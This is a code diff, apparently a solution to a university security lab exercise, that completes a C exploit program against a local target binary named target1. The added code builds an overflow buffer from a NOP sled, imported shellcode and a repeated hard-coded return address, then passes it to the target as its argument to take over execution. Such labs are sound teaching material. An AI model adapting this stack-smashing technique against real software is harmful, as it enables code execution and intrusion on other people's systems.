@@ -5,15 +5,41 @@
 #include "shellcode-64.h"
 
 #define TARGET "../targets/target1"
-
+#define TARGET_ADDR 0x40a4fe58
+#define TARGET_ADDR_0 0x58
+#define TARGET_ADDR_1 0xfe
+#define TARGET_ADDR_2 0xa4
+#define TARGET_ADDR_3 0x40
+#define BUFSIZE 112
+#define SHELLSIZE 45
 int
 main ( int argc, char * argv[] )
 {
 	char *	args[3];
 	char *	env[1];
+	char attackBuffer[BUFSIZE + 8 + 8 + 1];
+	int i = 0;
+	for (i = 0; i < BUFSIZE + 8 + 8 + 1; i++){
+		if(i%4==0){
+			attackBuffer[i] = TARGET_ADDR_0;
+		}else if(i%4==1){
+			attackBuffer[i] = TARGET_ADDR_1;
+		}else if(i%4==2){
+			attackBuffer[i] = TARGET_ADDR_2;
+		}else{
+			attackBuffer[i] = TARGET_ADDR_3;
+		}
+	}
+	for (i = 0; i < 3*8; i++){
+		attackBuffer[i] = 0x90;
+	}
+	for (i = 0; i < SHELLSIZE; i++){
+		attackBuffer[i + 3*8] = shellcode[i];
+	}
+	attackBuffer[BUFSIZE + 8 + 8] = '\0';
 
 	args[0] = TARGET;
-	args[1] = "hi there";
+	args[1] = attackBuffer;
 	args[2] = NULL;
 
 	env[0] = NULL;
